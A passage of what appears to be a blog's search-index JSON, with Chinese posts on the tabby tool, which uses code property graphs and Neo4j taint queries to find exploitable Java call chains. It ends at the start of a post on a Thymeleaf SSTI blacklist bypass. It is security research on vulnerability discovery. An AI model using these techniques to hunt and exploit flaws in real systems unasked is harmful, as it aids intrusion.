<p>\u901a\u8fc7\u7ec4\u5408\u4e0a\u8ff0\u4e09\u4e2a\u5b50\u56fe\uff0c\u6211\u4eec\u6700\u7ec8\u53ef\u4ee5\u8fbe\u5230 2 \u4e2a\u6548\u679c 1. \u76f4\u63a5\u5229\u7528 Neo4j \u7684\u67e5\u8be2\u8bed\u6cd5\u5373\u53ef\u5b8c\u6210\u6709\u6548\u8def\u5f84\u679a\u4e3e\u5de5\u4f5c 2. \u53ef\u4ee5\u5c06\u201c\u6709\u6548\u201d\u8def\u5f84\u7684\u5224\u522b\u4e0b\u653e\u5230\u56fe\u6570\u636e\u5e93\u4e2d\u5b8c\u6210\uff08\u5373\u8fc7\u7a0b\u95f4\u6570\u636e\u6d41\u5206\u6790\uff09</p>","tags":["Java"]},{"location":"blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/#2","title":"2. \u7ed3\u5408\u56fe\u6570\u636e\u5e93\u7684\u6c61\u70b9\u5206\u6790\u5f15\u64ce","text":"<p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u6765\u770b\u770b\u5982\u4f55\u5728\u56fe\u6570\u636e\u5e93\u4e2d\u6765\u5224\u5b9a\u201c\u6709\u6548\u201d\u8def\u5f84 \u4e3a\u4e86\u80fd\u66f4\u597d\u7684\u7ed3\u5408\u56fe\u6570\u636e\u5e93\u7684\u6280\u672f\u4f18\u52bf\uff0c\u6211\u4eec\u91cd\u65b0\u7f16\u6392\u4e86\u7a0b\u5e8f\u5206\u6790\u7684\u6574\u4f53\u6d41\u7a0b\uff0c\u7b80\u5355\u6765\u770b\uff0c\u5c06\u5176\u5206\u4e3a\u5316\u6574\u4e3a\u96f6\u548c\u5316\u96f6\u4e3a\u6574\u4e24\u4e2a\u90e8\u5206\u3002 \u5316\u6574\u4e3a\u96f6\u90e8\u5206\u7740\u91cd\u4e8e\u751f\u6210 PDG\uff08program data graph\uff09\uff0c\u4f7f\u5f97\u6bcf\u4e00\u6761\u51fd\u6570\u8c03\u7528\u8fb9\u4e0a\u90fd\u6709\u5165\u53c2\u7b49\u53d8\u91cf\u7684\u6c61\u70b9\u4fe1\u606f\u3002 \u5316\u96f6\u4e3a\u6574\u90e8\u5206\u7740\u91cd\u4e8e\u5229\u7528 PDG \u548c\u56fe\u6570\u636e\u5e93\u7684\u8def\u5f84\u68c0\u7d22\u80fd\u529b\uff0c\u91cd\u5efa\u51fd\u6570\u8c03\u7528\u94fe\u8def\u3002\u91cd\u5efa\u8fc7\u7a0b\u4ee5\u6c61\u70b9\u4fe1\u606f\u52a8\u6001\u63a8\u7b97\uff0c\u8fb9\u526a\u679d\u65e0\u6548\u8c03\u7528\u8fb9\u91cd\u5efa\u94fe\u8def\uff0c\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u7f13\u89e3\u4e86\u8def\u5f84\u7206\u70b8\u95ee\u9898\u3002</p>","tags":["Java"]},{"location":"blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/#_1","title":"\u5316\u6574\u4e3a\u96f6","text":"<p>\u5316\u6574\u4e3a\u96f6\u90e8\u5206\u6d89\u53ca\u4e86\u5355\u51fd\u6570\u8fc7\u7a0b\u5185\u5206\u6790\u7b97\u6cd5\u548c\u8de8\u51fd\u6570\u8fc7\u7a0b\u95f4\u5206\u6790\u7b97\u6cd5\u3002 \u5355\u51fd\u6570\u8fc7\u7a0b\u5185\u5206\u6790\u7b97\u6cd5\u7684\u5b9e\u73b0\u4ee5\u9759\u6001\u5206\u6790\u6846\u67b6 SOOT \u4f5c\u4e3a\u57fa\u7840\uff0c\u5728 SOOT \u8f6c\u5316\u7684 Jimple \u8bed\u6cd5\u4e2d\u8fdb\u884c\u76f8\u5e94\u7684\u6307\u9488\u5206\u6790\u3002\u6b64\u5904\uff0c\u4f9d\u636e Java \u7684\u8bed\u6cd5\u89c4\u5219\uff0c\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa 12 \u79cd\u6c61\u70b9\u6d41\u8f6c\u89c4\u5219  \u5173\u4e8e\u8fc7\u7a0b\u5185\u5206\u6790\u7ec6\u8282\uff0c\u5728 ppt 15 \u4e2d\uff0c\u7ed9\u4e86\u4e00\u4e2a\u52a8\u6001\u7684\u5206\u6790\u6848\u4f8b\uff0c\u5728\u6b64\u5c31\u4e0d\u5728\u7d2f\u8ff0\u4e86\u3002</p> <p>\u6211\u4eec\u91cd\u70b9\u6765\u770b\u4e00\u4e0b\u8fc7\u7a0b\u95f4\u5206\u6790\u7b97\u6cd5\u3002\u5728\u7a0b\u5e8f\u5206\u6790\u6280\u672f\u7684\u53d1\u5c55\u8fc7\u7a0b\u4e2d\uff0c\u6709\u5f88\u591a\u7528\u4e8e\u52a0\u5feb\u5206\u6790\u901f\u5ea6\u7684\u65b9\u6cd5\u3002\u6211\u4eec\u91c7\u7528\u4e86\u57fa\u4e8e\u6458\u8981\u7684\u8fc7\u7a0b\u95f4\u5206\u6790\u7b97\u6cd5\uff0c\u4e5f\u5c31\u662f\u6bcf\u5206\u6790\u5b8c\u4e00\u4e2a\u51fd\u6570\u5185\u5bb9\u540e\u751f\u6210\u76f8\u5e94\u7684\u8bed\u4e49\u7f13\u5b58\uff0c\u8be5\u7f13\u5b58\u53ef\u7528\u4e8e\u63cf\u8ff0\u7ecf\u8fc7\u8c03\u7528\u8be5\u51fd\u6570\u540e\u51fd\u6570\u8c03\u7528\u8005\u3001\u51fd\u6570\u5165\u53c2\u3001\u51fd\u6570\u8fd4\u56de\u503c\u7684\u76f8\u5173\u8bed\u4e49\u4fe1\u606f\u3002\u5229\u7528\u7f13\u5b58\u4fe1\u606f\u53ef\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u907f\u514d\u7a0b\u5e8f\u5206\u6790\u8fc7\u7a0b\u4e2d\u7684\u91cd\u590d\u8ba1\u7b97\u95ee\u9898\u3002</p> <p>\u6211\u4eec\u7ad9\u5728\u524d\u4eba\u7684\u80a9\u8180\u4e0a\u8bbe\u8ba1\u4e86 tabby \u7684\u8bed\u4e49\u7f13\u5b58\u7cfb\u7edf\u3002\u4ece Java \u8bed\u6cd5\u7684\u89d2\u5ea6\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u51fd\u6570\u8fd0\u884c\u5b8c\u53ef\u80fd\u4f1a\u5bf9\u51fd\u6570\u8c03\u7528\u8005\u548c\u51fd\u6570\u5165\u53c2\u53d8\u91cf\u4ea7\u751f\u5f71\u54cd\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5728\u51fd\u6570\u8fd0\u884c\u5b8c\u6700\u540e\u7684\u8bed\u53e5\u540e\uff0c\u6574\u7406\u51fa\u5f53\u524d\u51fd\u6570\u8c03\u7528\u8005\u548c\u51fd\u6570\u5165\u53c2\u6240\u53d1\u751f\u7684\u53d8\u5316\u3002\u540c\u65f6\uff0c\u5982\u679c\u5f53\u524d\u51fd\u6570\u6709\u8fd4\u56de\u503c\uff0c\u8fd8\u9700\u8981\u8bb0\u5f55\u8be5\u8fd4\u56de\u503c\u540c\u51fd\u6570\u8c03\u7528\u8005\u4ee5\u53ca\u51fd\u6570\u5165\u53c2\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u4f7f\u5f97\u6c61\u70b9\u80fd\u901a\u8fc7\u8fd4\u56de\u503c\u8fdb\u4e00\u6b65\u4f20\u9012\u3002\u6709\u4e86\u8fd9\u4e9b\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u70b9\u53ef\u4ee5\u653e\u5728\u51fd\u6570\u8c03\u7528\u8005\u3001\u51fd\u6570\u5165\u53c2\u5217\u8868\u4ee5\u53ca\u51fd\u6570\u8fd4\u56de\u503c\u4e0a\uff0c\u5c06\u6240\u53d1\u751f\u7684\u8bed\u4e49\u53d8\u5316\u62bd\u8c61\u6210\u4e00\u8bed\u4e49\u6458\u8981\u4f9b\u540e\u7eed\u51fd\u6570\u8c03\u7528\u5206\u6790\u4f7f\u7528\u3002</p> <p>\u4ee5\u4e0b\u56fe\u4ee3\u7801\u4e3a\u4f8b\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b tabby \u7684\u8bed\u4e49\u7f13\u5b58\u7cfb\u7edf\u5b9e\u73b0  \u4eba\u5de5\u5206\u6790 swap \u51fd\u6570\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 arg0 \u548c arg1 \u8fdb\u884c\u4e86\u4ea4\u6362\uff0c\u8fd4\u56de\u503c\u540c arg0 \u76f8\u5173\u3002 \u90a3\u4e48\uff0c\u6211\u4eec\u9700\u8981\u7528\u4e00\u5b9a\u7684\u89c4\u5219\u6765\u5f62\u6210\u8bed\u4e49\u7f13\u5b58\u7ed3\u6784\u3002 1. \u5b9a\u4e49\u6c61\u70b9\u5b9e\u4f53\u8868\u793a \u7531\u4e8e\u6c61\u70b9\u5173\u7cfb\u9003\u4e0d\u51fa\u51fd\u6570\u8c03\u7528\u8005\u3001\u51fd\u6570\u5165\u53c2\u548c\u51fd\u6570\u8fd4\u56de\u503c\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u5173\u952e\u5b57\u4e0a\u53ea\u9700\u8981\u5b9a\u4e49 3 \u79cd\uff1a<code>this</code>\u3001<code>param-n</code>\u3001<code>return</code>\uff0c\u5176\u4e2d <code>param-n</code> n \u4e3a 0\uff5en \u8303\u56f4\u5185\u7684\u81ea\u7136\u6570\uff0c\u6570\u5b57\u6307\u4ee3\u5165\u53c2\u4f4d\u7f6e\u4fe1\u606f\u3002 2. \u5b9a\u4e49\u6c61\u70b9\u5b9e\u4f53\u7279\u6b8a\u8868\u793a \u9664\u4e86\u5bf9\u53d8\u91cf\u672c\u8eab\u7684\u8868\u793a\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u8003\u8651\u53d8\u91cf\u5c5e\u6027\u3001\u53d8\u91cf\u6570\u7ec4\u7b49\u7279\u6b8a\u8868\u793a\uff0c\u7528 <code>&lt;f&gt;</code> \u6307\u4ee3\u7c7b\u5c5e\u6027\uff1b\u7528 <code>&lt;a&gt;</code> \u6307\u4ee3\u53d8\u91cf\u6570\u7ec4\uff1b<code>&lt;s&gt;</code> \u6307\u4ee3\u4ec5\u6e05\u9664\u5e76\u7ee7\u627f\u53f3\u503c\u6c61\u70b9\u4fe1\u606f\u4f46\u4e0d\u6539\u53d8\u53d8\u91cf\u6307\u5411\u5173\u7cfb\uff1b<code>&lt;m&gt;</code> \u6307\u4ee3\u4e0d\u6e05\u9664\u539f\u6709\u6c61\u70b9\u4fe1\u606f\uff0c\u540c\u65f6\u7ee7\u627f\u53f3\u503c\u6c61\u70b9\u4fe1\u606f\uff0c\u4f46\u4e0d\u6539\u53d8\u53d8\u91cf\u6307\u5411\u5173\u7cfb\u3002 \u4e3e\u51e0\u4e2a\u5b9e\u9645\u4f8b\u5b50\uff0c<code>this&lt;f&gt;name : param-0</code> \u8868\u793a\u5e94\u5904\u7406\u5f53\u524d\u51fd\u6570\u8c03\u7528\u8005\u7684\u7c7b\u5c5e\u6027 name \u4e3a\u7b2c\u4e00\u4e2a\u51fd\u6570\u5165\u53c2\u7684\u5185\u5bb9\uff1b<code>this&lt;a&gt; : param-0</code> \u8868\u793a\u5f53\u524d\u51fd\u6570\u8c03\u7528\u8005\u4e3a\u6570\u7ec4\u7c7b\u578b\uff0c\u9700\u5c06\u7b2c\u4e00\u4e2a\u51fd\u6570\u5165\u53c2\u653e\u5165\u51fd\u6570\u8c03\u7528\u8005\u7684\u6570\u7ec4\u79cd\u3002 \u5229\u7528\u4e0a\u9762\u4e24\u4e2a\u5b9a\u4e49\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5f53\u524d swap \u51fd\u6570\u7684\u8bed\u4e49\u7f13\u5b58\u4fe1\u606f\u603b\u7ed3\u4e3a <pre><code>actions {\n    \"param-0\" : [\"param-1\"],\n    \"param-1\" : [\"param-0\"],\n    \"return\"  : [\"param-0\"]\n}\n</code></pre> \u6709\u4e86\u8fd9\u6837\u4e00\u4e2a\u8bed\u4e49\u7f13\u5b58\u7ed3\u6784\u4e4b\u540e\uff0c\u6211\u4eec\u9700\u8981\u5c06\u8fd9\u4e00\u7f13\u5b58\u4fe1\u606f\u5e94\u7528\u5230\u8c03\u7528\u51fd\u6570\u7684\u5206\u6790\u4e2d\uff0c\u4e5f\u5c31\u662f\u4f8b\u5b50\u4e2d b \u51fd\u6570\u7684\u5206\u6790\u3002 \u8bed\u4e49\u7f13\u5b58\u7684\u5229\u7528\u53ef\u4ee5\u5206\u4e3a 3 \u4e2a\u6b65\u9aa4 1. \u521d\u59cb\u5316\u5e76\u590d\u5236\u6240\u6709\u6d89\u53ca\u7684\u53d8\u91cf\u4fe1\u606f\uff0c\u5305\u62ec\u51fd\u6570\u8c03\u7528\u8005\u3001\u51fd\u6570\u5165\u53c2\u53d8\u91cf\u5217\u8868 2. \u6839\u636e\u8bed\u4e49\u7f13\u5b58\u505a\u6c61\u70b9\u8d4b\u503c\u64cd\u4f5c 3. \u6e05\u695a\u4e34\u65f6\u53d8\u91cf \u4ee5\u4e0a\u8ff0 b \u51fd\u6570\u7684\u5206\u6790\u4e3a\u4f8b\uff0c\u53ef\u4ee5\u5c06\u5176\u5e94\u7528\u8fc7\u7a0b\u8f6c\u6362\u4e3a\u4e0b\u8868\u7684\u6d41\u7a0b  \u6b64\u5916\uff0c\u9664\u4e86\u5f62\u6210\u51fd\u6570\u672c\u8eab\u7684\u8bed\u4e49\u6458\u8981\u4fe1\u606f\u5916\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u540c\u65f6\u751f\u6210\u8fb9\u4e0a\u7684\u6c61\u70b9\u6570\u636e\u7f13\u5b58\uff0c\u4e5f\u5c31\u662f PDG \u7684\u751f\u6210\u3002\u8fd9\u90e8\u5206\u4e3b\u8981\u6807\u8bc6\u5f53\u524d\u51fd\u6570\u8c03\u7528\u7684\u5404\u4e2a\u53d8\u91cf\u540c\u5f53\u524d\u51fd\u6570\u7684\u51fd\u6570\u8c03\u7528\u8005\u3001\u51fd\u6570\u5165\u53c2\u4e4b\u95f4\u7684\u8054\u7cfb\uff0c\u4ee5\u4e00\u6574\u578b\u6570\u7ec4\u8868\u793a\u3002 \u6570\u7ec4\u4f4d\u7f6e\u4fe1\u606f\u6307\u4ee3\u5f53\u524d\u8c03\u7528\u53d8\u91cf\u7684\u4f4d\u7f6e\u4fe1\u606f\uff0c\u6570\u7ec4\u6570\u503c\u4fe1\u606f\u6307\u4ee3\u5f53\u524d\u4f4d\u7f6e\u4e0a\u7684\u53d8\u91cf\u7684\u6c61\u70b9\u4fe1\u606f\u3002 \u6570\u503c\u4fe1\u606f\u89c4\u5219\u5982\u4e0b\u8868\u6240\u793a  \u4ee5 b \u51fd\u6570\u8c03\u7528 swap \u4e3a\u4f8b\uff0c\u5047\u8bbe\u53d8\u91cf a0 \u6765\u6e90\u4e8e\u53c2\u6570 0\uff0c\u90a3\u4e48 <code>A a2 = swap(a0, a1);</code> \u8f6c\u5316\u7684\u6c61\u70b9\u6570\u7ec4\u4e3a <code>[-1,0, -3]</code>\uff0c\u8fd9\u91cc swap \u7684\u8c03\u7528\u8005\u4e3a\u9690\u542b\u53d8\u91cf\uff0c\u5373 <code>this</code> \u4e3a\u51fd\u6570\u8c03\u7528\u8005\u3002</p> <p>\u505a\u4e2a\u5c0f\u7ed3\uff0c\u5316\u6574\u4e3a\u96f6\u90e8\u5206\u4e3b\u8981\u5185\u5bb9\u4e3a\u6c61\u70b9\u5206\u6790\uff0c\u5e76\u751f\u6210\u8bed\u4e49\u7f13\u5b58\u3002\u51fd\u6570\u672c\u8eab\u7684\u8bed\u4e49\u7f13\u5b58\u4e3b\u8981\u7528\u4e8e\u5206\u6790\u8fc7\u7a0b\u4e2d\u7f13\u89e3\u91cd\u590d\u8ba1\u7b97\u7684\u95ee\u9898\uff1b\u8c03\u7528\u8fb9\u4e0a\u7684\u8bed\u4e49\u7f13\u5b58\u7528\u4e8e\u540e\u7eed\u5316\u96f6\u4e3a\u6574\u7684\u52a8\u6001\u6570\u636e\u6d41\u5206\u6790\uff0c\u5373 PDG</p>","tags":["Java"]},{"location":"blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/#_2","title":"\u5316\u96f6\u4e3a\u6574","text":"<p>\u6709\u4e86\u76f8\u5173\u7684\u8bed\u4e49\u7f13\u5b58\u4fe1\u606f\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u7f16\u5199 neo4j \u7684\u6269\u5c55\u6765\u5b9e\u73b0\u52a8\u6001\u81ea\u5b9a\u4e49\u7684\u6c61\u70b9\u6570\u636e\u6d41\u5206\u6790\uff0c\u6765\u770b\u4e00\u4e2a\u5b9e\u9645\u7684\u4f8b\u5b50  \u9996\u5148\uff0c\u4eba\u5de5\u5206\u6790\u4e00\u4e0b M1 \u51fd\u6570\u548c M2 \u51fd\u6570\uff0c\u53ef\u4ee5\u77e5\u9053\u7684\u662f M2 \u51fd\u6570\u5b58\u5728\u5371\u9669\u51fd\u6570 <code>Runtime.exec</code>\uff0c\u5e76\u4e14\u4e00\u4e2a\u6765\u81ea\u4e8e\u53c2\u6570 0\uff0c\u4e00\u4e2a\u6765\u6e90\u4e8e\u53c2\u6570 1\u3002\u56de\u6eaf\u5230 M1 \u7684\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4f20\u5165 M2 \u7684\u53c2\u6570 0 \u4e3a\u53d7\u6c61\u67d3\u7684\u53d8\u91cf\uff0c\u53c2\u6570 1 \u4e3a\u56fa\u5b9a\u5b57\u7b26\u4e32\uff0c\u4e0d\u53d7\u6c61\u67d3\u3002\u90a3\u4e48\uff0c\u7ecf\u8fc7\u4eba\u5de5\u5206\u6790\uff0c\u5b9e\u9645\u53ef\u4ee5\u5f97\u5230\u4e0a\u9762\u6807\u7ea2\u7684\u51fd\u6570\u8c03\u7528\u8def\u5f84\u662f\u5b58\u5728\u6f0f\u6d1e\u7684\u3002\u90a3\u4e48\uff0c\u4ece\u6c61\u70b9\u6570\u7ec4\u4e2d\u8fdb\u884c\u63a8\u7b97\u8be5\u5982\u4f55\u8fdb\u884c\u5462\uff1f \u4ee5 <code>M1-[-3,-1,-3]-&gt;M2</code> \u8fd9\u4e2a\u8282\u70b9\u4e3a\u4f8b 1. M1 \u51fd\u6570\u6709\u57fa\u7840\u7684\u6c61\u70b9\u4fe1\u606f <code>[-1]</code>\uff0c\u6307\u4ee3\u5f53\u524d\u8ddf\u51fd\u6570\u8c03\u7528\u8005\u672c\u8eab\u6709\u5173\u7684\u90fd\u662f\u53d7\u6c61\u67d3\u7684 2. <code>a.M2(this.data, \"ifconfig\")</code> \u7684\u8fb9\u4e0a\u6c61\u70b9\u4fe1\u606f\u4e3a <code>[-3,-1,-3]</code> 3. \u5229\u7528 1 \u548c 2 \u7684\u4e24\u4e2a\u6570\u7ec4\uff0c\u63a8\u5f97 M2 \u7684\u57fa\u7840\u6c61\u70b9\u4fe1\u606f\u4e3a <code>[0]</code>\uff0c\u8868\u793a\u4f20\u5165\u5230 M2 \u51fd\u6570\u7684\u8ddf\u5165\u53c2 0 \u76f8\u5173\u7684\u53d8\u91cf\u90fd\u662f\u53d7\u6c61\u67d3\u7684 \u4f9d\u6b21\u7c7b\u63a8\uff0c\u53ef\u4ee5\u5f97\u51fa\u7b2c\u4e00\u4e2a <code>exec</code> \u51fd\u6570\u7684\u57fa\u7840\u6c61\u70b9\u4fe1\u606f\u4e3a <code>[0]</code>\uff0c\u8868\u793a\u5f53\u524d\u8c03\u7528 <code>exec</code> \u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u53ef\u63a7\u7684\u3002\u6211\u4eec\u90fd\u77e5\u9053\u5982\u679c <code>exec</code> \u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u53ef\u63a7\u7684\u8bdd\uff0c\u5f53\u524d\u51fd\u6570\u8c03\u7528\u94fe\u8def\u5c31\u662f\u6709\u95ee\u9898\u7684\uff0c\u53ef\u4ee5\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6ce8\u5165\u3002 \u800c\u7b2c\u4e8c\u4e2a <code>exec</code> \u51fd\u6570\u7684\u8c03\u7528\uff0c\u5728\u8fb9\u4fe1\u606f <code>[-3,1]</code> \u4e2d\u627e\u4e0d\u5230 M2 \u7684 <code>[0]</code>\uff0c\u5219\u5f97\u4e0d\u51fa\u5f53\u524d exec \u7684\u57fa\u7840\u6c61\u70b9\u4fe1\u606f\uff0c\u6240\u4ee5\u5f53\u524d\u7684\u8c03\u7528\u8def\u5f84\u662f\u4e0d\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u5b89\u5168\u95ee\u9898\u7684\u3002</p> <p>\u901a\u8fc7\u4e0a\u8ff0\u4f8b\u5b50\u7684\u63a8\u7b97\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u7f16\u5199 neo4j \u7684\u6c61\u70b9\u63a8\u7b97\u6269\u5c55\uff0c\u901a\u8fc7\u8be5\u6269\u5c55\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u81ea\u5b9a\u4e49\u51fd\u6570\u5728\u56fe\u6570\u636e\u5e93\u4e0a\u8fdb\u884c\u52a8\u6001\u7684\u6c61\u70b9\u6570\u636e\u6d41\u5206\u6790\uff0c\u6316\u6398\u5b58\u5728\u5b89\u5168\u95ee\u9898\u7684\u51fd\u6570\u8c03\u7528\u94fe\u8def\u3002</p> <p>\u6700\u7ec8\uff0c\u901a\u8fc7\u8fd9\u4e24\u4e2a\u9636\u6bb5\u7684\u7ec4\u5408\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 neo4j \u7684\u67e5\u8be2\u8bed\u6cd5\u6765\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\u3002</p>","tags":["Java"]},{"location":"blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/#2_1","title":"#2 \u6f0f\u6d1e\u6316\u6398\u6848\u4f8b","text":"<p>\u622a\u6b62\u76ee\u524d\uff0c\u6211\u4eec\u5df2\u7ecf\u4f7f\u7528 tabby \u6316\u6398\u5230\u4e86 60+ 0day \u6f0f\u6d1e\u548c 8 \u4e2a CVE\u3002\u672c\u8282\u5c06\u5206\u4eab\u4e00\u4e2a\u5b9e\u9645\u7684 web \u6f0f\u6d1e\u6316\u6398\u6848\u4f8b\uff0c\u5176\u4f59\u6848\u4f8b\u53ef\u4ee5\u76f4\u63a5\u770b\u6587\u672b\u7684 ppt\u3002</p> <p>\u9996\u5148\uff0ctabby \u5bf9\u5e38\u89c1\u7684 web \u7aef\u70b9\u8fdb\u884c\u4e86\u8bc6\u522b\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528 <code>IS_ENDPOINT</code> \u5c5e\u6027\u6765\u8868\u793a source \u51fd\u6570\u3002\u6b64\u5904\u7684\u4f8b\u5b50\u6bd4\u8f83\u7279\u6b8a\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u6846\u67b6\u7684\u7279\u6b8a source \u8fdb\u884c neo4j \u8bed\u53e5\u4e0a\u7684\u63cf\u8ff0 <pre><code>match (source:Method {NAME:\"doAction\"})&lt;-[:HAS]-(c:Class)-[:INTERFACE|EXTENDS*]-&gt;(c1:Class {NAME:\"nc.bs.framework.adaptor.IHttpServletAdaptor\"})\n</code></pre> \u63cf\u8ff0\u5f53\u524d source \u7684\u51fd\u6570\u540d\u4e3a <code>doAction</code>\uff0c\u4e14\u5f53\u524d source \u7684\u5f52\u5c5e\u7c7b\u5b9e\u73b0\u4e86 <code>IHttpServletAdaptor</code> \u63a5\u53e3</p> <p>\u5176\u6b21\uff0ctabby \u5185\u7f6e\u4e86\u4e00\u4e9b\u5e38\u89c1\u7684 sink \u51fd\u6570\uff0c\u4f7f\u7528 <code>VUL</code> \u5c5e\u6027\u6765\u533a\u5206 <pre><code>match (sink:Method {IS_SINK: true, VUL: \"FILE_WRITE\"})\n</code></pre> \u63cf\u8ff0\u67e5\u627e\u6587\u4ef6\u4e0a\u4f20\u76f8\u5173\u7684\u5371\u9669\u51fd\u6570</p> <p>\u6700\u540e\uff0c\u6211\u4eec\u5229\u7528 tabby path finder \u63d0\u4f9b\u7684\u5177\u5907\u6c61\u70b9\u5206\u6790\u7684\u6269\u5c55\u51fd\u6570\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\u94fe\u6316\u6398 <pre><code>call tabby.algo.findAllVul(sources, sinks, 8, false) yield path\nreturn path limit 1\n</code></pre> \u901a\u8fc7\u7ec4\u5408\u4e0a\u8ff0\u67e5\u8be2\u8bed\u53e5\uff0c\u6700\u7ec8\u53ef\u4ee5\u67e5\u8be2\u51fa\u4e00\u6761\u6709\u6548\u7684\u5b58\u5728\u6f0f\u6d1e\u7684\u51fd\u6570\u8c03\u7528\u94fe\u8def\u3002 </p> <p>\u4e0a\u8ff0\u4f8b\u5b50\u662f\u5229\u7528 tabby \u6700\u7b80\u5355\u7684\u4e00\u79cd\u5e94\u7528\u65b9\u5f0f\uff0c\u8fd8\u6709\u66f4\u591a\u7684\u4f7f\u7528\u65b9\u6cd5\u7b49\u7740\u4f60\u6765\u63a2\u7d22 XD</p>","tags":["Java"]},{"location":"blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/#3","title":"#3 \u603b\u7ed3","text":"<p>\u968f\u7740\u6280\u672f\u7684\u53d1\u5c55\uff0c\u7a0b\u5e8f\u5206\u6790\u6280\u672f\u548c\u56fe\u6570\u636e\u5e93\u7684\u7ed3\u5408\u5728\u81ea\u52a8\u5316\u6f0f\u6d1e\u6316\u6398\u7684\u5e94\u7528\u4e0a\u53d8\u6210\u4e86\u4e00\u79cd\u8d8b\u52bf\u3002\u6700\u8fd1\u51e0\u5e74\u5f88\u706b\u7684 CodeQL \u4e5f\u662f\u57fa\u4e8e\u8fd9\u79cd\u601d\u8def\u5f00\u53d1\u7684\u3002\u672c\u6587\u6240\u63d0\u53ca\u7684\u5b9e\u8df5\u4ec5\u4e3a\u4e00\u79cd\u7c97\u6d45\u7684\u5c1d\u8bd5\uff0c\u4e3b\u8981\u4ecb\u7ecd\u4e86 tabby \u7684\u4e24\u4e2a\u91cd\u8981\u90e8\u5206\u7684\u8bbe\u8ba1\u548c\u5b9e\u73b0\u601d\u8def\u3002\u6b22\u8fce\u6709\u5174\u8da3\u7684\u540c\u5b66\u6765\u4e00\u8d77\u4ea4\u6d41\u548c\u5b9e\u8df5 XD</p> <p>\u53e6\u5916\uff0c\u6b64\u6587\u7684\u53e6\u4e00\u4e2a\u76ee\u7684\u662f\u4f5c\u4e3a KCON 2022 \u8bae\u9898 \u300a tabby: java code review like a pro \u300b \u7684\u4e00\u4e2a\u8865\u5145\uff0c\u4ece\u6587\u7ae0\u7684\u65b9\u5f0f\u89e3\u91ca\u4e86 ppt \u4e2d\u4e0d\u592a\u6e05\u6670\u7684\u70b9\u3002\u5982\u679c\u4f60\u8fd8\u6709\u5176\u4ed6\u7684\u7591\u95ee\uff0c\u975e\u5e38\u6b22\u8fce\u79c1\u6211\u4ea4\u6d41 XD</p>","tags":["Java"]},{"location":"blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/","title":"Thymeleaf ssti 3.1.2 \u9ed1\u540d\u5355\u7ed5\u8fc7","text":"","tags":["Java","ctf"]},{"location":"blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/#0x01","title":"0x01 \u524d\u8a00","text":"<ul> <li>thymeleaf \u6a21\u7248\u5bf9\u4e8e SpEL \u8868\u8fbe\u5f0f\u7684\u89e3\u6790\u5177\u6709\u9ed1\u540d\u5355\u4e0a\u7684\u7c7b\u578b\u68c0\u67e5\uff08\u6700\u65e9\u8ffd\u6eaf\u5230\u4ec0\u4e48\u65f6\u95f4\u6682\u65f6\u6ca1\u627e\u5230\uff09</li> <li>\u5728 2023.07 thymeleaf \u51fa\u4e86\u4e2a\u6c99\u7bb1\u7ed5\u8fc7\u7684\u6f0f\u6d1e CVE-2023-38286\uff0c\u5f71\u54cd\u7248\u672c\u662f 